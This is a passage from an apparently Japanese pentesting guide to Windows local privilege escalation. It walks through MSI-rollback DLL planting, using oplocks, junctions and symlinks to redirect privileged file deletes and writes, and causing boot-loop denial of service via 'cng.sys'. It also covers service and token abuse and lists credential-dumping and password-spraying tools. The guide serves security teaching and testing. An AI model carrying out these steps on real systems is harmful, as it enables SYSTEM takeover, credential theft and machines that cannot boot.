Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、この問題のあるパスを修正しました。COM 呼び出しは引き続き成功を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に追加されなくなります。メソッドの戻り値が成功したかどうかで修正を判断せず、2025 年 4 月の Windows セキュリティ更新プログラムを適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は以下のとおりです。

1. **ステージ 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- ステップ 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **非管理者ユーザー**が実行できるよう、インストーラーを **「UAC Compliant」** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- ステップ 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いているファイル handle に対して `GetFinalPathNameByHandle` を **ポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- ステップ 3: 独自の同期処理
    - `.msi` には **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が含まれ、次の処理を行います。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別のイベントを待ってからアンインストールを続行します。

- ステップ 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **ファイルの削除を阻止できます**。
    - その後、アンインストールを完了できるよう通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、内容をすべて削除できないため、**`C:\Config.Msi` は削除されません**。

- ステップ 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` が空になり**、Hijack の準備が整います。

> この時点で、**SYSTEM レベルの任意フォルダー削除 vulnerability を実行**し、`C:\Config.Msi` を削除します。

2. **ステージ 2 – Rollback Script を悪意のあるものに置き換える**

- ステップ 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を開いたままにします。

- ステップ 7: 別のインストールを実行する
    - 以下の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を発生させる変数。
    - このインストールを使って **rollback** を再度発生させ、`.rbs` と `.rbf` を読み込ませます。

- ステップ 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使い、`C:\Config.Msi` に新しい `.rbs` が現れるまで監視します。
    - そのファイル名を取得します。

- ステップ 9: Rollback の前に同期する
    - `.msi` には **カスタムインストールアクション（`SyncBeforeRollback`）** が含まれ、次の処理を行います。
        - `.rbs` が作成されたときにイベントを通知します。
        - その後、続行する前に待機します。

- ステップ 10: 弱い ACL を再適用する
    - `.rbs created` イベントを受け取った後:
        - Windows Installer は `C:\Config.Msi` に **強い ACL を再適用します**。
        - しかし、`WRITE_DAC` を持つ handle がまだあるため、**弱い ACL を再適用できます**。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- ステップ 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意のある DLL）を **特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **SYSTEM レベルの悪意ある payload DLL** を含む偽の `.rbf` を配置します。

- ステップ 12: Rollback を実行する
    - 同期イベントを通知し、インストーラーを再開させます。
    - 既知のタイミングでインストールを **意図的に失敗させる**よう、**type 19 のカスタムアクション（`ErrorOut`）** が設定されています。
    - これにより **rollback が開始**します。

- ステップ 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意のある `.rbs` を読み込みます。
        - `.rbf` DLL をターゲットの場所にコピーします。
    - これで **SYSTEM が読み込むパスに悪意のある DLL が配置されます**。

- 最終ステップ: SYSTEM のコードを実行する
    - Hijack した DLL を読み込む、信頼された **自動昇格バイナリ**（例: `osk.exe`）を実行します。
    - **これで、コードが SYSTEM として実行されます**。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、`C:\Config.Msi` のような **フォルダー全体を削除できる**ことを前提としています。しかし vulnerability が **任意のファイル削除**しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

この stream には、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` stream を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除する primitive は使えなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. ステップ 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. ステップ 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって実行が**一時停止**します。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt`に到達すると、**oplockがトリガーされ**、制御がcallbackに渡されます。

4. Step 4: oplock callback内 — 削除先をリダイレクトする

- Option A: `file1.txt`を別の場所に移動する
    - oplockを解除せずに`folder1`を空にできます。
    - `file1.txt`を直接削除しないでください。oplockが早期に解除されます。

- Option B: `folder1`を**junction**に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink によって、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除される。

### 任意のフォルダー作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる** primitive を悪用します。**ファイルを書き込めない**場合や、**弱いアクセス許可を設定できない**場合でも可能です。

次のように、**重要な Windows driver** の名前で**フォルダー**（ファイルではなく）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておく**と、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から介入しない限り（例：ブート修復やディスクへのアクセス）、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks を使った任意ファイルの上書き／起動 DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログやエクスポートを書き込む場合、Object Manager symlinks と NTFS mount points を使ってそのパスをリダイレクトすれば、（SeCreateSymbolicLinkPrivilege がなくても）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先パスを保存する設定ファイルを攻撃者が書き換えられること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃の例**
1. 設定ファイルを読み、特権ログの保存先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: 管理者が「テスト SMS を送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parserで）調べて破損を確認します。再起動すると、Windowsは改ざんされたドライバーのパスを読み込もうとし、**boot loop DoS**が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーがある場合、そちらが先に試されることがあり、破損データを使った信頼性の高い DoS の標的になります。



## **High Integrity から System へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への昇格**は、新しいサービスを**作成して実行する**だけで簡単に行えることがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する際は、有効なserviceであること、または必要な処理をすぐに実行することを確認してください。有効なserviceでない場合、20秒後に強制終了されます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ラッパーを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法についてはこちらを参照してください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは[こちら](seimpersonate-from-high-to-system.md)にあります。**

### SeDebug + SeImpersonateからFull Token privilegesへ

これらのtoken privilegesがある場合（おそらく、すでにHigh Integrityのプロセスで見つかります）、SeDebug privilegeを使って**ほぼすべてのプロセス**（保護されたプロセスを除く）を開き、そのプロセスの**tokenをコピー**して、そのtokenで**任意のプロセスを作成**できます。\
この手法では通常、すべてのtoken privilegesを持つSYSTEMとして実行中のプロセスを**選択します**（_すべてのtoken privilegesを持たないSYSTEMプロセスもあります_）。\
**提案した手法を実行するコード例は[こちら](sedebug-+-seimpersonate-copy-token.md)にあります。**

### **Named Pipes**

この手法は、meterpreterの`getsystem`で権限昇格する際に使われます。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**サーバー**は、pipeクライアント（service）の**tokenを偽装**し、SYSTEM privilegesを取得できます。\
[name pipesについて詳しく知りたい場合はこちらをお読みください。](#named-pipe-client-impersonation)\
[name pipesを使ってHigh IntegrityからSystemに昇格する例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

SYSTEMとして実行中の**プロセスによって読み込まれる**dllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種の権限昇格にも有効です。また、dllの読み込みに使われるフォルダーへの**書き込み権限**があるため、High Integrityプロセスからは**はるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは[こちら](dll-hijacking/index.html)をご覧ください。**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEからfull privsへ

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 詳細情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格の手掛かりを探す最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集します（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体に対してsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioでコンパイルする必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストをenumerateします（privescというより情報収集ツールです）（コンパイルが必要です） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにprecompiled executableがあります）。推奨しません。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（Python製exe）。推奨しません。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を基に作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの.NETを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のコマンドを実行します。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linuxローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows攻撃: ATは新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServer認証情報の復号 → Veeam CVE-2023-27532によるSYSTEM権限の取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とkernel tokenの窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel Shadowsでの追跡劇](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsのSymbolic Linkの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリのハイジャック](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopとのPwn2Own: CLDFLTとDirectX KernelのRace Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配するI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃パート2: CVE-2020-1013、Windows 10のローカル権限昇格1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを調べる](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからのSsh秘密鍵の抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – パート1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – パート2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEMに至る経路をたどり直す](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Servicesの共有メモリオフセットに関する権限昇格アドバイザリ](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
